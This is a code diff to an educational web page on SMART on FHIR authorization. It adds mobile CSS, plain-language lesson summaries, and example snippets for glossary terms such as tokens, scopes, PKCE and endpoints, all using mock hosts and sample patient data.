@@ -160,6 +160,14 @@
     @keyframes slideIn { from { transform: translateX(24px); opacity: 0; } to { transform: none; opacity: 1; } }
 
     .json-scroll { scroll-behavior: smooth; }
+    #discovery-file, #guided-step { scroll-margin-top: 9rem; }
+    /* Sideways-scrolling rows (tabs, step numbers) without a visible scrollbar */
+    .no-scrollbar { scrollbar-width: none; }
+    .no-scrollbar::-webkit-scrollbar { display: none; }
+    /* Phones: a label and its button stack instead of squeezing the text */
+    @media (max-width: 639px) {
+      main .justify-between { flex-wrap: wrap; }
+    }
     :focus-visible { outline: 2px solid rgb(var(--sky-500)); outline-offset: 2px; }
     .tab-btn { transition: color 0.15s ease, border-color 0.15s ease; }
     .json-key-row:hover { background: rgb(var(--slate-800) / 0.5); }
@@ -345,6 +353,7 @@
       {
         id: 1,
         number: "Concept Video 1",
+        plain: ["Think of a FHIR server as a library of health records. Some are open to everyone: a public test server such as HAPI holds made-up patients, so any app can ask for data and get it straight back.", "A hospital's server holds real people's private records. If an app asks it for Eleanor's lab results without permission, the server answers `401 Unauthorized`, which means \"I don't know who you are.\"", "So being able to ask for data and being allowed to see it are two different things. SMART on FHIR is the shared set of rules for getting that permission. Every server that follows it publishes the same kind of settings file, so John's app can learn how to ask at any hospital."],
         title: "Why Apps Need Permission (Authorized Access)",
         loomUrl: "https://www.loom.com/share/843674d6f22747c9b28fb5aada43c7ee",
         coreTakeaway: "Authorized access: An app's ability to request FHIR data does not automatically give it permission to access that data.",
@@ -358,6 +367,7 @@
       {
         id: 2,
         number: "Concept Video 2",
+        plain: ["When an app asks for permission, it lists exactly what it wants. Each item on that list is called a scope.", "A scope reads like a short sentence in three parts. `patient/Observation.rs` means: for the patient in this session (`patient/`), lab results and other measurements (`Observation`), read and search them (`.rs`).", "Apps should ask for as little as possible. John's app only draws a graph, so it asks for `.rs`. It never needs `.cruds`, which would also let it create, change and delete records.", "Three lists matter: what the server supports (in its settings file), what the app requests, and what is finally granted after John approves. A scope appearing in the server's list does not mean the app has it."],
         title: "Scopes Define Permissions (Requested vs. Granted)",
         loomUrl: "https://www.loom.com/share/3369130614fe45979bbb22923a8b1dc6",
         coreTakeaway: "Scopes define permissions: Consider which information an app needs and which actions it should be allowed to perform.",
@@ -371,6 +381,7 @@
       {
         id: 3,
         number: "Concept Video 3",
+        plain: ["Getting permission happens in two moves. First the app sends John's browser to the hospital's sign-in page. John signs in and approves, and the browser returns to the app carrying a one-time code.", "Then the app trades that code for tokens, directly with the server. PKCE protects the trade: at the start, the app sent a scrambled fingerprint of a secret; now it shows the secret itself. Someone who stole the code still cannot use it without that secret.", "The app gets back several pieces, each with one job. The access token is the key it shows the FHIR server to get data. The ID token says who signed in: John. The patient context says whose records these are: Eleanor's."],
         title: "Behind the Scenes: OAuth 2.0, PKCE & Token Jobs",
         loomUrl: "https://www.loom.com/share/3e42c614b4c3437f90086f441c4a2560",
         coreTakeaway: "Different pieces, different jobs: Authorization determines permitted access, identity information helps the app recognize the signed-in user, and patient context identifies whose records the connection concerns.",
@@ -385,6 +396,7 @@
       {
         id: 4,
         number: "Concept Video 4",
+        plain: ["Real systems from Epic and Oracle Health follow the same pattern you have just seen. What changes is where the connection starts.", "In a standalone launch, the app starts on its own, like John opening an app on his phone. He signs in and picks whose records to connect.", "In an EHR launch, the app starts inside the hospital's record system. A clinician already has a chart open, so the EHR hands the app a launch token and the patient is known without asking.", "A backend service has no person signing in at all. One server talks to another and proves who it is with a signed key, for jobs such as nightly reports.", "Two different files describe a server: `/metadata` lists what health data it holds, and `/.well-known/smart-configuration` lists how to get permission."],
         title: "Real-World Flowcharts: Epic, Oracle Health & Launch Patterns",
         loomUrl: "https://www.loom.com/share/5e754a8a98d946d295b0893c7fb9fbf8",
         coreTakeaway: "Recognizing shared patterns: Understanding the fundamentals helps you interpret different workflows, follow technical documentation, and investigate connection problems.",
@@ -1220,140 +1232,140 @@
     // GLOSSARY DATA — comprehensive, categorized, alphabetical
     const GLOSSARY_TERMS = [
       // ── Acronyms & Abbreviations ──────────────────────────────────────────
-      { term: "API", category: "Acronyms", def: "Application Programming Interface. A defined contract for software components to communicate. FHIR resources are exposed over RESTful APIs using standard HTTP verbs (GET, POST, PUT, DELETE)." },
+      { term: "API", category: "Acronyms", def: "Application Programming Interface. A defined contract for software components to communicate. FHIR resources are exposed over RESTful APIs using standard HTTP verbs (GET, POST, PUT, DELETE).", example: "GET https://api.mock.health/fhir/Patient/pat-mother-eleanor-456" },
       { term: "EHR", category: "Acronyms", def: "Electronic Health Record. A digital system used by clinical staff (e.g. Epic, Oracle Health/Cerner, Meditech) that stores patient demographics, encounters, lab results, medications, and clinical notes." },
-      { term: "FHIR", category: "Acronyms", def: "Fast Healthcare Interoperability Resources (HL7 FHIR). A standard for exchanging healthcare information electronically using RESTful APIs and JSON/XML resources." },
+      { term: "FHIR", category: "Acronyms", def: "Fast Healthcare Interoperability Resources (HL7 FHIR). A standard for exchanging healthcare information electronically using RESTful APIs and JSON/XML resources.", example: "{\n  \"resourceType\": \"Patient\",\n  \"id\": \"pat-mother-eleanor-456\",\n  \"birthDate\": \"1948-05-02\"\n}" },
       { term: "HL7", category: "Acronyms", def: "Health Level Seven International. The standards development organization that publishes the FHIR specification and other healthcare interoperability standards." },
-      { term: "HTTP", category: "Acronyms", def: "Hypertext Transfer Protocol. The foundation of data communication for the web. FHIR APIs and OAuth 2.0 flows run over HTTP (and HTTPS with TLS encryption)." },
-      { term: "JWT", category: "Acronyms", def: "JSON Web Token (RFC 7519). A compact, URL-safe token format consisting of three Base64Url-encoded sections — Header, Payload (claims), and Signature — separated by dots. Used for id_tokens and sometimes access_tokens." },
-      { term: "JWKS", category: "Acronyms", def: "JSON Web Key Set. A publicly accessible JSON document (at the jwks_uri endpoint) publishing the cryptographic public keys that apps use to verify JWT signatures." },
-      { term: "LOINC", category: "Acronyms", def: "Logical Observation Identifiers Names and Codes. A standard coding system for clinical observations. For example, LOINC 4548-4 = HbA1c. Used inside FHIR Observation resources to identify what was measured." },
-      { term: "MRN", category: "Acronyms", def: "Medical Record Number. A health system's internal patient identifier. Different from a FHIR Patient resource ID, though often mapped to it." },
-      { term: "OIDC", category: "Acronyms", def: "OpenID Connect. An identity layer built on top of OAuth 2.0 that adds the id_token and standard user claims such as sub and name. SMART adds its own fhirUser claim on top." },
-      { term: "PHI", category: "Acronyms", def: "Protected Health Information. Any individually identifiable health information protected under HIPAA. Real EHR servers require SMART on FHIR authorization before returning PHI." },
-      { term: "PKCE", category: "Acronyms", def: "Proof Key for Code Exchange (RFC 7636). A security extension to OAuth 2.0 that prevents authorization code interception attacks by requiring a code_verifier secret paired with a code_challenge hash." },
-      { term: "REST", category: "Acronyms", def: "Representational State Transfer. An architectural style for web APIs. FHIR uses RESTful conventions: resources have URLs, HTTP verbs describe actions, and responses are JSON or XML." },
-      { term: "RFC", category: "Acronyms", def: "Request for Comments. Documents published by the IETF (Internet Engineering Task Force) defining internet standards. OAuth 2.0 = RFC 6749, PKCE = RFC 7636, JWT = RFC 7519, Bearer tokens = RFC 6750." },
-      { term: "SMART", category: "Acronyms", def: "Substitutable Medical Apps, Reusable Technologies. A set of open standards (built on OAuth 2.0 + FHIR) enabling apps to securely connect to any SMART-compatible EHR with a consistent authorization pattern." },
+      { term: "HTTP", category: "Acronyms", def: "Hypertext Transfer Protocol. The foundation of data communication for the web. FHIR APIs and OAuth 2.0 flows run over HTTP (and HTTPS with TLS encryption).", example: "GET /fhir/Observation?patient=pat-mother-eleanor-456 HTTP/1.1\nHost: api.mock.health" },
+      { term: "JWT", category: "Acronyms", def: "JSON Web Token (RFC 7519). A compact, URL-safe token format consisting of three Base64Url-encoded sections — Header, Payload (claims), and Signature — separated by dots. Used for id_tokens and sometimes access_tokens.", example: "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyLTQyIn0.N8Ru9dlHN4ep...\n\nheader   {\"alg\":\"RS256\"}\npayload  {\"sub\":\"user-42\"}\nthird part: the signature" },
+      { term: "JWKS", category: "Acronyms", def: "JSON Web Key Set. A publicly accessible JSON document (at the jwks_uri endpoint) publishing the cryptographic public keys that apps use to verify JWT signatures.", example: "{\n  \"keys\": [{\n    \"kty\": \"RSA\", \"kid\": \"smart-key-1\", \"alg\": \"RS384\",\n    \"n\": \"0vx7agoebGcQSuu...\", \"e\": \"AQAB\"\n  }]\n}" },
+      { term: "LOINC", category: "Acronyms", def: "Logical Observation Identifiers Names and Codes. A standard coding system for clinical observations. For example, LOINC 4548-4 = HbA1c. Used inside FHIR Observation resources to identify what was measured.", example: "4548-4   Hemoglobin A1c/Hemoglobin.total in Blood" },
+      { term: "MRN", category: "Acronyms", def: "Medical Record Number. A health system's internal patient identifier. Different from a FHIR Patient resource ID, though often mapped to it.", example: "{ \"type\": { \"text\": \"MRN\" }, \"value\": \"E1234567\" }" },
+      { term: "OIDC", category: "Acronyms", def: "OpenID Connect. An identity layer built on top of OAuth 2.0 that adds the id_token and standard user claims such as sub and name. SMART adds its own fhirUser claim on top.", example: "scope=openid fhirUser\n\n\"id_token\": \"eyJhbGciOiJSUzI1NiJ9...\"   (who signed in)" },
+      { term: "PHI", category: "Acronyms", def: "Protected Health Information. Any individually identifiable health information protected under HIPAA. Real EHR servers require SMART on FHIR authorization before returning PHI.", example: "{ \"resourceType\": \"Observation\", \"subject\": { \"reference\": \"Patient/pat-mother-eleanor-456\" },\n  \"code\": { \"text\": \"Hemoglobin A1c\" }, \"valueQuantity\": { \"value\": 6.8, \"unit\": \"%\" } }" },
+      { term: "PKCE", category: "Acronyms", def: "Proof Key for Code Exchange (RFC 7636). A security extension to OAuth 2.0 that prevents authorization code interception attacks by requiring a code_verifier secret paired with a code_challenge hash.", example: "code_verifier  = dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk\ncode_challenge = E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM" },
+      { term: "REST", category: "Acronyms", def: "Representational State Transfer. An architectural style for web APIs. FHIR uses RESTful conventions: resources have URLs, HTTP verbs describe actions, and responses are JSON or XML.", example: "GET    /fhir/Observation?patient=pat-mother-eleanor-456   (read)\nPOST   /fhir/Observation                                 (create)\nPUT    /fhir/Observation/obs-1                           (update)\nDELETE /fhir/Observation/obs-1                           (delete)" },
+      { term: "RFC", category: "Acronyms", def: "Request for Comments. Documents published by the IETF (Internet Engineering Task Force) defining internet standards. OAuth 2.0 = RFC 6749, PKCE = RFC 7636, JWT = RFC 7519, Bearer tokens = RFC 6750.", example: "RFC 6749  OAuth 2.0\nRFC 7636  PKCE\nRFC 7519  JSON Web Token (JWT)" },
+      { term: "SMART", category: "Acronyms", def: "Substitutable Medical Apps, Reusable Technologies. A set of open standards (built on OAuth 2.0 + FHIR) enabling apps to securely connect to any SMART-compatible EHR with a consistent authorization pattern.", example: "GET https://api.mock.health/fhir/.well-known/smart-configuration\nscope=launch/patient openid fhirUser patient/Observation.rs" },
       { term: "SSO", category: "Acronyms", def: "Single Sign-On. During an EHR launch the clinician is already signed in to the EHR, so many EHRs establish the SMART session without a second login. That is EHR behavior; it is not what the sso-openid-connect capability promises." },
-      { term: "TLS", category: "Acronyms", def: "Transport Layer Security. The encryption protocol (formerly SSL) that secures HTTP traffic as HTTPS. All OAuth flows, token endpoints, and FHIR API calls must use HTTPS/TLS to protect tokens in transit." },
-      { term: "TTL", category: "Acronyms", def: "Time To Live. The duration (in seconds) an access_token remains valid, specified in the token response as 'expires_in'. Typically 3600 seconds (1 hour) for SMART tokens." },
-      { term: "URL", category: "Acronyms", def: "Uniform Resource Locator. A web address. In SMART on FHIR, URLs are used for FHIR base URLs, OAuth endpoints (authorization_endpoint, token_endpoint), redirect_uris, and JWKS endpoints." },
+      { term: "TLS", category: "Acronyms", def: "Transport Layer Security. The encryption protocol (formerly SSL) that secures HTTP traffic as HTTPS. All OAuth flows, token endpoints, and FHIR API calls must use HTTPS/TLS to protect tokens in transit.", example: "https://api.mock.health   (the s in https means TLS)" },
+      { term: "TTL", category: "Acronyms", def: "Time To Live. The duration (in seconds) an access_token remains valid, specified in the token response as 'expires_in'. Typically 3600 seconds (1 hour) for SMART tokens.", example: "\"expires_in\": 3600   (the access token works for one hour)" },
+      { term: "URL", category: "Acronyms", def: "Uniform Resource Locator. A web address. In SMART on FHIR, URLs are used for FHIR base URLs, OAuth endpoints (authorization_endpoint, token_endpoint), redirect_uris, and JWKS endpoints.", example: "https://api.mock.health/fhir/Observation?patient=pat-mother-eleanor-456" },
       // ── Tokens ────────────────────────────────────────────────────────────
-      { term: "access_token", category: "Tokens", def: "An opaque string or signed JWT issued by the authorization server. Presented to the FHIR Resource Server via the 'Authorization: Bearer <token>' header to gain access to patient data within granted scopes. Never send to the id_token's intended audience." },
-      { term: "id_token", category: "Tokens", def: "A signed JWT provided by OpenID Connect. Contains assertions about user identity (sub, fhirUser, name). Intended only for the client app UI — never send to the FHIR API as a Bearer token!" },
-      { term: "refresh_token", category: "Tokens", def: "A longer-lived credential issued when offline_access (or, in an EHR launch, online_access) is granted. Sent to the token_endpoint (grant_type=refresh_token) to obtain a new access_token when the current one expires, without prompting the user to log in again." },
-      { term: "Bearer", category: "Tokens", def: "An HTTP Authorization scheme (RFC 6750). The header 'Authorization: Bearer <access_token>' tells the FHIR server to grant access to 'whoever bears (carries) this token'. Always requires HTTPS." },
-      { term: "opaque token", category: "Tokens", def: "An access_token that is a random, server-side reference string (e.g. 'st_live_99a8b7c6...') with no readable payload. The FHIR server must call the introspection_endpoint to validate it. Contrast with JWT." },
+      { term: "access_token", category: "Tokens", def: "An opaque string or signed JWT issued by the authorization server. Presented to the FHIR Resource Server via the 'Authorization: Bearer <token>' header to gain access to patient data within granted scopes. Never send to the id_token's intended audience.", example: "{\n  \"access_token\": \"eyJhbGciOiJSUzM4NCJ9...\",\n  \"token_type\": \"Bearer\",\n  \"expires_in\": 3600\n}" },
+      { term: "id_token", category: "Tokens", def: "A signed JWT provided by OpenID Connect. Contains assertions about user identity (sub, fhirUser, name). Intended only for the client app UI — never send to the FHIR API as a Bearer token!", example: "{\n  \"iss\": \"https://api.mock.health\",\n  \"sub\": \"user-john-caregiver-42\",\n  \"aud\": \"john-graph-app\",\n  \"fhirUser\": \"RelatedPerson/john-42\",\n  \"exp\": 1740003600,\n  \"iat\": 1740000000\n}" },
+      { term: "refresh_token", category: "Tokens", def: "A longer-lived credential issued when offline_access (or, in an EHR launch, online_access) is granted. Sent to the token_endpoint (grant_type=refresh_token) to obtain a new access_token when the current one expires, without prompting the user to log in again.", example: "POST /smart/token\ngrant_type=refresh_token&refresh_token=rt_8f2c1d9e4b7a..." },
+      { term: "Bearer", category: "Tokens", def: "An HTTP Authorization scheme (RFC 6750). The header 'Authorization: Bearer <access_token>' tells the FHIR server to grant access to 'whoever bears (carries) this token'. Always requires HTTPS.", example: "Authorization: Bearer eyJhbGciOiJSUzM4NCJ9..." },
+      { term: "opaque token", category: "Tokens", def: "An access_token that is a random, server-side reference string (e.g. 'st_live_99a8b7c6...') with no readable payload. The FHIR server must call the introspection_endpoint to validate it. Contrast with JWT.", example: "st_live_99a8f3c2b1d0e4f5   (means nothing to the app)" },
       // ── OAuth Parameters & Claims ──────────────────────────────────────────
-      { term: "aud", category: "OAuth / Claims", def: "Audience. In authorization requests, the aud parameter specifies the target FHIR server URL the access_token should be scoped to. In JWT payloads, the aud claim identifies which system(s) should accept this token. Epic has required aud since its May 2023 version; for standalone launches, only when launch/patient or launch/encounter is requested." },
-      { term: "code_challenge", category: "OAuth / Claims", def: "The hashed, public half of the PKCE pair. Computed as BASE64URL(SHA256(code_verifier)) and sent with the authorization request. Safe to transmit in the URL because SHA-256 is a one-way function." },
-      { term: "code_verifier", category: "OAuth / Claims", def: "The secret, random string (43–128 chars) generated by the app before the authorization request. Kept in app memory and sent to the token_endpoint. The server hashes it to verify it matches the earlier code_challenge." },
-      { term: "grant_type", category: "OAuth / Claims", def: "Specifies which OAuth 2.0 workflow is being used in a token request. SMART supports: authorization_code (user-facing flows), refresh_token (renewal), and client_credentials (backend services)." },
-      { term: "iss", category: "OAuth / Claims", def: "Issuer. In an EHR launch, ?iss= is the FHIR server's base URL; the app adds /.well-known/smart-configuration to it to find the server's settings. Inside an id_token, iss is the OpenID issuer that signed the token." },
-      { term: "nonce", category: "OAuth / Claims", def: "A unique, random value included in the authorization request and echoed in the id_token. Prevents replay attacks where an attacker tries to reuse a captured id_token." },
-      { term: "redirect_uri", category: "OAuth / Claims", def: "The URL the authorization server redirects the browser to after the user approves access, delivering the authorization code. Must be pre-registered with the EHR and match exactly." },
-      { term: "response_type", category: "OAuth / Claims", def: "Specifies what the authorization server should return. SMART uses response_type=code (the authorization code flow) — the server redirects with a temporary code that the app exchanges at the token_endpoint." },
-      { term: "scope", category: "OAuth / Claims", def: "A space-delimited string of permissions requested by the app (e.g. 'patient/Observation.rs launch/patient openid offline_access'). The server may grant fewer scopes than requested." },
-      { term: "state", category: "OAuth / Claims", def: "A cryptographically random value generated per request and sent in the authorization redirect. The app verifies the returned state matches exactly to prevent Cross-Site Request Forgery (CSRF) attacks." },
+      { term: "aud", category: "OAuth / Claims", def: "Audience. In authorization requests, the aud parameter specifies the target FHIR server URL the access_token should be scoped to. In JWT payloads, the aud claim identifies which system(s) should accept this token. Epic has required aud since its May 2023 version; for standalone launches, only when launch/patient or launch/encounter is requested.", example: "&aud=https%3A%2F%2Fapi.mock.health%2Ffhir" },
+      { term: "code_challenge", category: "OAuth / Claims", def: "The hashed, public half of the PKCE pair. Computed as BASE64URL(SHA256(code_verifier)) and sent with the authorization request. Safe to transmit in the URL because SHA-256 is a one-way function.", example: "&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM" },
+      { term: "code_verifier", category: "OAuth / Claims", def: "The secret, random string (43–128 chars) generated by the app before the authorization request. Kept in app memory and sent to the token_endpoint. The server hashes it to verify it matches the earlier code_challenge.", example: "&code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk" },
+      { term: "grant_type", category: "OAuth / Claims", def: "Specifies which OAuth 2.0 workflow is being used in a token request. SMART supports: authorization_code (user-facing flows), refresh_token (renewal), and client_credentials (backend services).", example: "grant_type=authorization_code\ngrant_type=refresh_token\ngrant_type=client_credentials" },
+      { term: "iss", category: "OAuth / Claims", def: "Issuer. In an EHR launch, ?iss= is the FHIR server's base URL; the app adds /.well-known/smart-configuration to it to find the server's settings. Inside an id_token, iss is the OpenID issuer that signed the token.", example: "https://app.example.org/launch?iss=https%3A%2F%2Fapi.mock.health%2Ffhir&launch=xyz987" },
+      { term: "nonce", category: "OAuth / Claims", def: "A unique, random value included in the authorization request and echoed in the id_token. Prevents replay attacks where an attacker tries to reuse a captured id_token.", example: "&nonce=n-0S6_WzA2Mj" },
+      { term: "redirect_uri", category: "OAuth / Claims", def: "The URL the authorization server redirects the browser to after the user approves access, delivering the authorization code. Must be pre-registered with the EHR and match exactly.", example: "&redirect_uri=https%3A%2F%2Fapp.example.org%2Fcallback" },
+      { term: "response_type", category: "OAuth / Claims", def: "Specifies what the authorization server should return. SMART uses response_type=code (the authorization code flow) — the server redirects with a temporary code that the app exchanges at the token_endpoint.", example: "&response_type=code" },
+      { term: "scope", category: "OAuth / Claims", def: "A space-delimited string of permissions requested by the app (e.g. 'patient/Observation.rs launch/patient openid offline_access'). The server may grant fewer scopes than requested.", example: "scope=launch/patient openid fhirUser patient/Observation.rs" },
+      { term: "state", category: "OAuth / Claims", def: "A cryptographically random value generated per request and sent in the authorization redirect. The app verifies the returned state matches exactly to prevent Cross-Site Request Forgery (CSRF) attacks.", example: "&state=9f1c2e7a-4b3d-4f8e-a6c1-2d9b8e7f3a10" },
       // ── JWT Claims ─────────────────────────────────────────────────────────
-      { term: "exp", category: "JWT Claims", def: "Expiration Time. Unix timestamp (seconds since 1970-01-01T00:00:00Z) after which the token must be rejected. Typically iat + 3600 for SMART access_tokens." },
-      { term: "iat", category: "JWT Claims", def: "Issued At. Unix timestamp when the authorization server created the JWT. Used to calculate token age and validate that it was recently issued." },
-      { term: "kid", category: "JWT Claims", def: "Key ID. A hint in the JWT header identifying which key in the JWKS was used to sign this token. Apps look up the matching key in the jwks_uri response to verify the signature." },
-      { term: "sub", category: "JWT Claims", def: "Subject. A stable, unique identifier for the authenticated user or entity within the issuer's identity namespace. Never contains PHI." },
+      { term: "exp", category: "JWT Claims", def: "Expiration Time. Unix timestamp (seconds since 1970-01-01T00:00:00Z) after which the token must be rejected. Typically iat + 3600 for SMART access_tokens.", example: "\"exp\": 1740003600   (seconds since 1 Jan 1970)" },
+      { term: "iat", category: "JWT Claims", def: "Issued At. Unix timestamp when the authorization server created the JWT. Used to calculate token age and validate that it was recently issued.", example: "\"iat\": 1740000000" },
+      { term: "kid", category: "JWT Claims", def: "Key ID. A hint in the JWT header identifying which key in the JWKS was used to sign this token. Apps look up the matching key in the jwks_uri response to verify the signature.", example: "\"kid\": \"smart-key-1\"" },
+      { term: "sub", category: "JWT Claims", def: "Subject. A stable, unique identifier for the authenticated user or entity within the issuer's identity namespace. Never contains PHI.", example: "\"sub\": \"user-john-caregiver-42\"" },
       // ── Scopes ─────────────────────────────────────────────────────────────
-      { term: "fhirUser", category: "Scopes & Identity", def: "When requested alongside openid, the authorization server includes a fhirUser claim in the id_token pointing to the signed-in user's FHIR resource (e.g. 'Practitioner/dr-smith-101')." },
-      { term: "launch", category: "Scopes & Identity", def: "An EHR Launch scope. Tells the authorization server that the app was launched from inside the EHR and that the launch= context token should be used to bind the authorization to the active patient/encounter." },
-      { term: "launch/patient", category: "Scopes & Identity", def: "A Standalone Launch scope. Requests that the authorization server prompt the user to select a patient from the portal, returning the chosen patient ID in the token response as the 'patient' context value." },
-      { term: "offline_access", category: "Scopes & Identity", def: "When granted, the token response includes a refresh_token enabling the app to silently renew access_tokens without user interaction after they expire. Essential for long-running clinical apps." },
-      { term: "openid", category: "Scopes & Identity", def: "Requesting this scope triggers OpenID Connect, causing the authorization server to include an id_token in the token response with identity claims about the signed-in user." },
-      { term: "patient/*.rs", category: "Scopes & Identity", def: "A wildcard scope granting read (r) and search (s) access to ALL FHIR resource types for the patient in context. Easier for prototyping but discouraged in production — prefer specific resource scopes." },
-      { term: "system/*.rs", category: "Scopes & Identity", def: "A system-level wildcard scope used in client_credentials (backend service) flows. Grants read/search access to ALL patients' records of ALL resource types — extremely powerful, requires careful governance." },
+      { term: "fhirUser", category: "Scopes & Identity", def: "When requested alongside openid, the authorization server includes a fhirUser claim in the id_token pointing to the signed-in user's FHIR resource (e.g. 'Practitioner/dr-smith-101').", example: "\"fhirUser\": \"https://api.mock.health/fhir/RelatedPerson/john-42\"" },
+      { term: "launch", category: "Scopes & Identity", def: "An EHR Launch scope. Tells the authorization server that the app was launched from inside the EHR and that the launch= context token should be used to bind the authorization to the active patient/encounter.", example: "&launch=xyz987_opaque_ehr_context" },
+      { term: "launch/patient", category: "Scopes & Identity", def: "A Standalone Launch scope. Requests that the authorization server prompt the user to select a patient from the portal, returning the chosen patient ID in the token response as the 'patient' context value.", example: "request:  scope=launch/patient openid fhirUser\nresponse: \"patient\": \"pat-mother-eleanor-456\"" },
+      { term: "offline_access", category: "Scopes & Identity", def: "When granted, the token response includes a refresh_token enabling the app to silently renew access_tokens without user interaction after they expire. Essential for long-running clinical apps.", example: "scope=launch/patient openid fhirUser offline_access" },
+      { term: "openid", category: "Scopes & Identity", def: "Requesting this scope triggers OpenID Connect, causing the authorization server to include an id_token in the token response with identity claims about the signed-in user.", example: "scope=openid fhirUser" },
+      { term: "patient/*.rs", category: "Scopes & Identity", def: "A wildcard scope granting read (r) and search (s) access to ALL FHIR resource types for the patient in context. Easier for prototyping but discouraged in production — prefer specific resource scopes.", example: "patient/*.rs   (every resource type, read and search)" },
+      { term: "system/*.rs", category: "Scopes & Identity", def: "A system-level wildcard scope used in client_credentials (backend service) flows. Grants read/search access to ALL patients' records of ALL resource types — extremely powerful, requires careful governance.", example: "system/*.rs   (every patient, for a backend service)" },
       // ── Endpoints ──────────────────────────────────────────────────────────
-      { term: "authorization_endpoint", category: "Endpoints", def: "The front-channel URL where the app redirects the user's browser for sign-in and consent. Found in /.well-known/smart-configuration. The browser's address bar is visible during this step." },
-      { term: "introspection_endpoint", category: "Endpoints", def: "A back-channel URL (/smart/introspect) that resource servers use to validate opaque access_tokens — checking whether a token is active, its scopes, and its expiry time." },
-      { term: "revocation_endpoint", category: "Endpoints", def: "A back-channel URL (/smart/revoke) that apps call to explicitly invalidate an access_token or refresh_token, typically when a user logs out of the app." },
-      { term: "token_endpoint", category: "Endpoints", def: "The back-channel URL where the app POSTs to exchange an authorization code (+ PKCE verifier) for tokens, or to use a refresh_token for renewal. Never visible in the browser address bar." },
+      { term: "authorization_endpoint", category: "Endpoints", def: "The front-channel URL where the app redirects the user's browser for sign-in and consent. Found in /.well-known/smart-configuration. The browser's address bar is visible during this step.", example: "\"authorization_endpoint\": \"https://api.mock.health/smart/authorize\"" },
+      { term: "introspection_endpoint", category: "Endpoints", def: "A back-channel URL (/smart/introspect) that resource servers use to validate opaque access_tokens — checking whether a token is active, its scopes, and its expiry time.", example: "POST /smart/introspect\ntoken=st_live_99a8f3c2...\n\n{ \"active\": true, \"scope\": \"patient/Observation.rs\" }" },
+      { term: "revocation_endpoint", category: "Endpoints", def: "A back-channel URL (/smart/revoke) that apps call to explicitly invalidate an access_token or refresh_token, typically when a user logs out of the app.", example: "POST /smart/revoke\ntoken=rt_8f2c1d9e4b7a..." },
+      { term: "token_endpoint", category: "Endpoints", def: "The back-channel URL where the app POSTs to exchange an authorization code (+ PKCE verifier) for tokens, or to use a refresh_token for renewal. Never visible in the browser address bar.", example: "\"token_endpoint\": \"https://api.mock.health/smart/token\"" },
       // ── SMART Capabilities ─────────────────────────────────────────────────
-      { term: "authorize-post", category: "SMART Capabilities", def: "Capability flag indicating the authorization server accepts authorization parameters as an HTTP POST body instead of query string GET params, avoiding URL length limits." },
-      { term: "client-confidential-asymmetric", category: "SMART Capabilities", def: "Capability indicating the server supports backend confidential clients authenticating at the token_endpoint using a signed private_key_jwt (asymmetric cryptography — no shared secret required)." },
-      { term: "client-confidential-symmetric", category: "SMART Capabilities", def: "Capability indicating the server supports confidential user-facing apps that authenticate at the token_endpoint with a shared client_secret (client_secret_basic or client_secret_post). Backend services must use asymmetric keys instead." },
-      { term: "client-public", category: "SMART Capabilities", def: "Capability indicating the server supports public clients (e.g. browser or mobile apps that cannot securely store a client_secret), authenticating via PKCE only (token_endpoint_auth_method=none)." },
-      { term: "context-banner", category: "SMART Capabilities", def: "Capability indicating the server can return 'need_patient_banner' in the token response, telling an embedded app whether to show its own patient header. The styling URL (smart_style_url) is a separate capability, context-style." },
-      { term: "launch-ehr", category: "SMART Capabilities", def: "Capability indicating the server supports the EHR Launch workflow, where the EHR initiates the app launch by passing ?iss= and ?launch= parameters to the app's launch URL." },
-      { term: "launch-standalone", category: "SMART Capabilities", def: "Capability indicating the server supports Standalone Launch, where the app starts independently (outside the EHR) and uses launch/patient to establish patient context." },
-      { term: "permission-v1", category: "SMART Capabilities", def: "Capability indicating support for SMART v1 scope syntax: patient/Observation.read (read-only) and patient/Observation.write (write-only). Coarser than v2." },
-      { term: "permission-v2", category: "SMART Capabilities", def: "Capability indicating support for SMART v2 granular scope syntax: patient/Observation.cruds where each letter grants a specific operation (c=create, r=read, u=update, d=delete, s=search)." },
-      { term: "sso-openid-connect", category: "SMART Capabilities", def: "Capability indicating the server supports SMART's OpenID Connect profile: it can issue an id_token (when the app asks for openid and fhirUser) that identifies the signed-in user. Whether the user skips a login screen is up to the EHR." },
+      { term: "authorize-post", category: "SMART Capabilities", def: "Capability flag indicating the authorization server accepts authorization parameters as an HTTP POST body instead of query string GET params, avoiding URL length limits.", example: "\"capabilities\": [ ..., \"authorize-post\", ... ]" },
+      { term: "client-confidential-asymmetric", category: "SMART Capabilities", def: "Capability indicating the server supports backend confidential clients authenticating at the token_endpoint using a signed private_key_jwt (asymmetric cryptography — no shared secret required).", example: "\"capabilities\": [ ..., \"client-confidential-asymmetric\", ... ]" },
+      { term: "client-confidential-symmetric", category: "SMART Capabilities", def: "Capability indicating the server supports confidential user-facing apps that authenticate at the token_endpoint with a shared client_secret (client_secret_basic or client_secret_post). Backend services must use asymmetric keys instead.", example: "\"capabilities\": [ ..., \"client-confidential-symmetric\", ... ]" },
+      { term: "client-public", category: "SMART Capabilities", def: "Capability indicating the server supports public clients (e.g. browser or mobile apps that cannot securely store a client_secret), authenticating via PKCE only (token_endpoint_auth_method=none).", example: "\"capabilities\": [ ..., \"client-public\", ... ]" },
+      { term: "context-banner", category: "SMART Capabilities", def: "Capability indicating the server can return 'need_patient_banner' in the token response, telling an embedded app whether to show its own patient header. The styling URL (smart_style_url) is a separate capability, context-style.", example: "\"capabilities\": [ ..., \"context-banner\", ... ]" },
+      { term: "launch-ehr", category: "SMART Capabilities", def: "Capability indicating the server supports the EHR Launch workflow, where the EHR initiates the app launch by passing ?iss= and ?launch= parameters to the app's launch URL.", example: "\"capabilities\": [ ..., \"launch-ehr\", ... ]" },
+      { term: "launch-standalone", category: "SMART Capabilities", def: "Capability indicating the server supports Standalone Launch, where the app starts independently (outside the EHR) and uses launch/patient to establish patient context.", example: "\"capabilities\": [ ..., \"launch-standalone\", ... ]" },
+      { term: "permission-v1", category: "SMART Capabilities", def: "Capability indicating support for SMART v1 scope syntax: patient/Observation.read (read-only) and patient/Observation.write (write-only). Coarser than v2.", example: "\"capabilities\": [ ..., \"permission-v1\", ... ]" },
